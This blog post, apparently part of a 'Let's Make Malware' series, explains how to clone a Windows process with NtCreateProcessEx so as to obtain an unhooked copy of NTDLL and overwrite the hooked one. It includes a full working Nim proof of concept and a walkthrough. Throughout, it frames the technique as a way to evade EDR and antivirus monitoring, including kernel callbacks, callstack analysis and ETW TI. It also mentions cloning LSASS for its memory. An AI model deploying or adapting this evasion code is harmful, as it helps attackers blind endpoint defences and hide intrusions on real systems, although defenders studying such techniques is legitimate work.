---
layout: post
title: Attack of The Clones - Unhooking and Syscall Stubs
---

![Lets Make Malware](/assets/lets_make_malware_header.jpg)

# Introduction
Today, we are going to return to our discussion on unhooking. In our [Let’s Make Malware -  Bypassing Behavioral Detections (Hooks and Trampolines)](https://reprgm.github.io/2023/08/03/lets-make-malware-part-9/) post, we talked about what function hooking is, how EDRs utilize it, as well as two methods for unhooking functions. 

The method we discussed in that post was unhooking from files on-disk and we briefly touched upon unhooking from suspended processes (also called the Perun’s Fart technique).

There are, of course, other ways to do this such as unhooking from KnownDlls and unhooking from remote servers.

Unhooking from a suspended process allows us to avoid the pitfalls of opening a handle to NTDLL.dll on-disk and mapping it, but what if we could improve upon this technique further?

That’s exactly what we will look into accomplishing.

# Unhooking from Suspended Processes

As we discussed in the post on hooks and trampolines, unhooking from suspended processes works because NTDLL.dll is one of the first DLLs to be loaded during process initialization. If we create a suspended process, we are halting its initialization right after this DLL has been loaded and prior to any others.

This means EDRs/AVs have not loaded their DLLs yet and thus have not hooked the functions within NTDLL.

A suspended process on its own is not inherently suspicious, however, a process that _starts_ suspended gets some scrutiny. The problem here is that, to get a clean, unhooked copy of NTDLL in the first place, we cannot suspend our sacrificial process later. It **must** be done from the start. 

Not to mention, we have kernel callbacks, Parent-Child process relationships and ETW (TI) to consider. 

So, what can we do?

# Enter Process Cloning

We can clone/fork the process! This lesser-known feature of Windows does not get enough love. There is a lot of potential here. 

A process clone/fork is really exactly what it sounds like: a nearly identical copy of a process. Two excellent posts have already been written about this functionality that will be linked in the resources section, so we won’t dive too deep into it here. 

What’s important to note is that process cloning allows us to get a clean copy of NTDLL. This is because the clone gets a copy of the original’s virtual memory address space. 

So, not only do we get NTDLL, but we also get many of the other DLLs as well (and other goodies if we clone processes like LSASS).

So, why is this an improvement over suspended processes?

First, cloned processes (using the `NtCreateProcessEx` function rather than `NtCreateUserProcess`) do not create/clone threads automatically. Because of this, process/thread creation kernel callbacks do not trigger. 

So, we have a ghost process as far as endpoint protection is concerned. Task Manager will not show these cloned processes.

Second, the clone is a child of the original process. This fixes any parent-child process anomalies. 

# Problems with Cloning

While this is an improvement over suspended processes, there are still some considerations to keep in mind. 

The biggest is that we cannot clone just _any_ process. If we clone a process that has the EDR’s DLLs loaded already and it’s copy of NTDLL is hooked, we end up replacing our process’s hooked NTDLL with another hooked NTDLL.

For that reason, we must ensure that the process we clone does not have the EDR’s DLLs loaded. We _could_ create a suspended process just to clone it. From the EDR’s perspective, a suspicious activity occurred (process created initially suspended) but nothing else happened afterwards. 

This would be a somewhat valid approach (we will discuss why only “somewhat” valid in a moment).

We could also enumerate all processes currently running and find one without the EDR’s DLLs. We can do this either manually or programmatically.

Otherwise, we can take a somewhat lazy approach and assume that the EDR won’t/can’t load DLLs into certain processes. 

Fortunately for us, this is the case. Protected processes like lsass and services.exe do not seem to be touched by EDRs. However, we also cannot touch them.

Svchost looks like a valid target as does msedge, msteams, and dllhost.

_Note: target processes that fit our criteria may vary._

The next problem is that although no kernel callbacks have been triggered by the creation of the cloned process, it isn’t _entirely_ invisible. 

`NtCreateProcessEx` is likely hooked itself, and through callstack analysis, EDRs can see a process (which can be identified through the parent-process handle function argument) is being created/cloned.

This is also why creating a process just to clone it is only a "somewhat valid approach". 

Fortunately, this is easy enough to get around as we have the option of using syscalls or trampolines here.

However, we then run into the issue of reading a remote process’s virtual memory. Endpoint protection can also use callstack analysis here to identify our cloned process.

This issue is not specific to process cloning, but it is a consideration that must be made.

We can avoid the hook that is likely on the `ReadProcessMemory`/`NtReadVirtualMemory` function by again using syscalls or trampolines, but ETW TI will still log this action of reading a remote process's virtual memory.

Normally, bypassing ETW TI would require us to be in kernel-mode, but once again we are in luck as new research has shown that we can get around parts of ETW TI (like reading virtual memory from a remote process) from userland if we have SE_DEBUG_PRIVILEGE enabled and are running some versions of Windows 10. 
This excellent post will also be linked in the resources section.

# Proof of Concept

So, what does all this look like in code? 

Well, it looks mostly identical to code for unhooking from a suspended process. 
_Note: this code is also available [here](https://github.com/RePRGM/Nimperiments/blob/main/unhook-from-clone.nim)

```nim
import winim
import ptr_math
import std/dynlib

type NtCreateProcessEx_t = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ParentProcess: HANDLE, Flags: ULONG, SectionHandle: HANDLE, DebugPort: HANDLE, ExceptionPort: HANDLE, InJob: BOOLEAN): NTSTATUS {.stdcall.}

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc getCleanNTDLL(): LPVOID =
    var hNtdll = loadLib("ntdll.dll")
    
    var status: NTSTATUS
    var procOA: OBJECT_ATTRIBUTES
    var hClone: HANDLE
    var pNtdll: LPVOID

    var NtCreateProcessEx = cast[NtCreateProcessEx_t](hNtdll.symAddr("NtCreateProcessEx"))
    var hPowershell = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, 8648)

    InitializeObjectAttributes(addr procOA, NULL, 0, cast[HANDLE](NULL), NULL)

    status = NtCreateProcessEx(addr hClone, PROCESS_ALL_ACCESS, addr procOA, hPowershell, cast[ULONG](0), cast[HANDLE](NULL), cast[HANDLE](NULL), cast[HANDLE](NULL), FALSE)

    if NT_SUCCESS(status):
        echo "[+] Successfully Cloned!\n[!]New PID: ", GetProcessId(hClone), "\n"
    else:
        echo "[-] Error Cloning Process! Error Code: 0x", toHex($status)

    var mi = MODULEINFO()
    let ntdllModule = GetModuleHandleA("ntdll.dll")
    GetModuleInformation(cast[HANDLE](-1), ntdllModule, addr mi, cast[DWORD](sizeof(mi)))

    pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage)
    var dwRead: SIZE_T
    let bSuccess = ReadProcessMemory(hClone, cast[LPCVOID](mi.lpBaseOfDll), pNtdll, mi.SizeOfImage, addr dwRead)
    if bSuccess == 0:
      echo "Failed in reading ntdll: ", GetLastError()
      quit(QuitFailure)
    return pntdll

proc unhook(cleanNtdll: LPVOID): bool =
    var 
        oldprotect: DWORD = 0
        SectionHeader: PIMAGE_SECTION_HEADER
    
    let low: uint16 = 0
    let hNtdll: HMODULE = GetModuleHandleA("ntdll.dll")
    let DOSHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](cleanNtdll)
    let NtHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](cleanNtdll) + DOSHeader.e_lfanew)
    for Section in low ..< NtHeader.FileHeader.NumberOfSections:
        SectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(NtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        if cmp(".text", toString(SectionHeader.Name)) == 0:
            echo "Found .text section"
            if VirtualProtect(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), SectionHeader.Misc.VirtualSize, 0x40, addr oldprotect) == 0: #0x40 = PAGE_EXECUTE_READWRITE
                echo fmt"VirtualProtect Failed! Error Code: ({GetLastError()})."
                return false
            copyMem(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), cleanNtdll + SectionHeader.VirtualAddress, SectionHeader.Misc.VirtualSize)
            if VirtualProtect(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), SectionHeader.Misc.VirtualSize, oldprotect, addr oldprotect) == 0:
                echo fmt"VirtualProtect Failed! Error Code: ({GetLastError()})."
                return false
            return true
    return false  

when isMainModule:
    echo "Press any key to continue..."
    discard readLine(stdin)
    let nt = getCleanNTDLL()
    echo "Clean NTDLL Stored At: 0x",  toHex(cast[ByteAddress](nt))
    echo "Press any key to continue..."
    discard readLine(stdin)
    echo "Unhooking!"
    let unhookResult = unhook(nt)
    if unhookResult:
        echo "NTDLL Has Been Refreshed!"
    else:
        echo "Could Not Refresh NTDLL!"
    echo "Press any key to quit..."
    discard readLine(stdin)
```
Let’s go through this Nim code piece by piece. 

First, since `NtCreateProcessEx` is an undocumented function, we cannot simply call it. First, we define its function signature. This is the line starting with type.

Second, we create a convenience function. This is our “toString” function (credits to …). All we do here is convert a byte array to a Nim String type.

Next, we have our "getCleanNTDLL" function. The first thing it does is get a handle to ntdll.dll. Then, using this handle, we find and save the address of the `NtCreateProcessEx` function so we can use it.

Next, we get a handle to an arbitrary process. This will be the process we clone. 

Note that the final parameter to `OpenProcess` is a PID. So, we must make sure to change this to a value that exists on the target system. Otherwise, we can implement a function to do this automatically.

We call `NtCreateProcessEx` to clone the process next and get back a handle to this new process.

Then, we find the base address and size of NTDLL.dll in our own process. Luckily for us, NTDLL.dll is mapped to the same address in every process, so by knowing where it is in our own process, we know where it is in other processes as well.

Once we have that information, we get the copy of NTDLL.dll in the clone process and save it in Heap memory.

Our unhook function takes the base address of our heap memory (that contains the clean copy of NTDLL.dll) and parses through it. It looks for the .text section, which contains all the instructions for the various functions we want to use, and then it overwrites our own process’s .text section with this clean copy.

Now, we can safely use NT API functions to do whatever our hearts desire. 

Of course, we aren’t limited to just unhooking functions. We can also use this method to save syscall stubs or IDs. 

![PoC Screenshot 1](/assets/clonetest-ntdll-hooked.png)

To drive the point home, if we look at NTDLL.dll in our own process at the start, we can see that `NtOpenProcess` (as well as others) do not look normal. The first instruction is `jmp` whereas it should be `mov r10, rcx`. This is how we know this function is hooked by the AV.

![PoC Screenshot 2](/assets/clonetest-ntdll-unhooked.png)

After we clone our target process and steal it’s clean copy of NTDLL.dll, we, of course, notice that `NtOpenProcess` looks as it should. Also, note that our clone does not have a copy of the AV’s DLLs (atcuf64.dll and bdhkm64.dll) as the original did not. 

The sky is the limit when it comes to cloning/forking processes.

# Resources
[Bill Demirkapi - Abusing Windows Implementation of Fork for Stealthy Memory Operations](https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/)

[Diversenok - Process Cloning](https://diversenok.github.io/2023/04/20/Process-Cloning.html)

[WaveStone - A Universal EDR Bypass Built in Windows 10](https://www.riskinsight-wavestone.com/en/2023/10/a-universal-edr-bypass-built-in-windows-10/)
